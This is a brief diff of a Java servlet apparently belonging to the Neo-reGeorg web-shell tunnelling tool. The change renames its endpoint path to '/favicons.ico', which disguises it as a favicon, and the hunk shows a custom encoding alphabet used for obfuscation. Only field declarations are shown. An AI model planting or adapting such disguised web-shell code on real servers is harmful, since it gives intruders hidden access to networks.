@@ -26,7 +26,7 @@ public class NeoreGeorgServlet implements Servlet {
     public HttpServletRequest request = null;
     public HttpServletResponse response = null;
     public String cs = "UTF-8";
-    public String path = "/favicondemo.ico";
+    public String path = "/favicons.ico";
     private static char[] en = "mKg4oAv5kZqU1LtrHfVOSsD6RwI/jlzBW2bEaih3pNyXuMGJxeTdcn+9P7Y8CF0Q".toCharArray();
     private static byte[] de = new byte[]{-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 54, -1, -1, -1, 27, 62, 12, 33, 39, 3, 7, 23, 57, 59, 55, -1, -1, -1, -1, -1, -1, -1, 5, 31, 60, 22, 35, 61, 46, 16, 26, 47, 1, 13, 45, 41, 19, 56, 63, 24, 20, 50, 11, 18, 32, 43, 58, 9, -1, -1, -1, -1, -1, -1, 36, 34, 52, 51, 49, 17, 2, 38, 37, 28, 8, 29, 0, 53, 4, 40, 10, 15, 21, 14, 44, 6, 25, 48, 42, 30, -1, -1, -1, -1, -1};
 
